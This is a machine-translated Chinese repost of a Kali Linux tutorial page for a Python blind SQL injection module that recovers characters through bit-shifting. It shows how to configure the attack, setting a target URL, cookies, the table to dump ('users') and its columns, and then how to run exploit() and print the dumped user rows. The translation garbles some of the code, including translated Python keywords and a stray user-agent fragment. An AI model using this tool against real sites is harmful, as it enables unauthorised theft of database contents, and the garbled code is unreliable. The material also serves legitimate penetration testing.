# 盲 SQL 位移位:一个盲 SQL 注入模块，它使用位移位来计算字符

> 原文：<https://kalilinuxtutorials.com/blind-sql-bitshifting/>

[![Blind SQL Bitshifting : A Blind SQL Injection Module That Uses Bitshfting To Calculate Characters](img/d68c1a9951da48c1cd085e5dab45e536.png "Blind SQL Bitshifting : A Blind SQL Injection Module That Uses Bitshfting To Calculate Characters")](https://1.bp.blogspot.com/-droDKlDZMgU/XTBN9cwLRtI/AAAAAAAABaM/IPE9FuiUUXIb931TWIP6XVPRx8QX2_NqQCLcBGAs/s1600/SQL.png)

这是一个执行盲 SQL 注入的模块，通过使用位移法来**计算**字符而不是猜测它们。根据配置，每个字符需要 7/8 个请求。

**用途**

**导入 blind-SQL-bitshift as x** 
**#编辑本字典配置攻击向量** x.options

**也可阅读-[Dwarf:基于 pyqt 5&Frida](https://kalilinuxtutorials.com/dwarf-arch-os-debugger-pyqt5-frida/)构建的全功能 Multi Arch/OS 调试器**

**示例配置**

**#脆弱链接**
x . options[" target "]= "http://www.example.com/index.php？id = 1 "

**#指定 cookie(可选)** x . options[" cookie "]= " "

**#指定特定行的条件，例如' uid=1 '表示 admin(可选)** x . options[" row _ condition "]= " "

**#用于后续重定向的布尔选项** x . options[" follow _ redirections "]= 0
Google bot/2.1；+http://www . Google . com/bot . html)"

**#指定要转储的表** x . options[" table _ name "]= " users "

**#指定要转储的列** x . options[" columns "]= " id，username "

**# String 检查成功后页面上的语句** x . options[" truth _ String "]=。

assume_only_ascii 选项使模块假定它要转储的字符都是 ascii 字符。由于 ASCII 字符集最多只能达到 127，所以我们可以将第一位设置为 0，而不用担心计算它。请求减少了 12.5%。在本地测试中，这产生了 15%的平均速度提升。当然，当转储 ASCII 范围之外的字符时，这会导致问题。默认情况下，它设置为 0。

**一旦配置完毕:**

**data = x.exploit()**

这将返回一个二维数组，每个子数组包含一行，第一行是列标题。

**示例输出:**

**[' id '，'用户名']，['1 '，' eclipse']，['2 '，' dotcpfile ']，['3 '，' Acey']，['4 '，' Wardy']，['5 '，' idek']]**

或者，您的脚本可以利用制表模块输出数据:

**from 制表导入制表
data = x.exploit()
打印制表(data，headers='firstrow '，#这指定使用第一行作为列标题。
tablefmt='psql') #使用 sql 输出格式。也可以使用其他格式。**

这将输出:

```
+------+------------+
|   id | username   |
|------+------------|
|    1 | eclipse    |
|    2 | dotcppfile |
|    3 | Acey       |
|    4 | Wardy      |
|    5 | idek       |
+------+------------+
```

[**Download**](https://github.com/awnumar/blind-sql-bitshifting)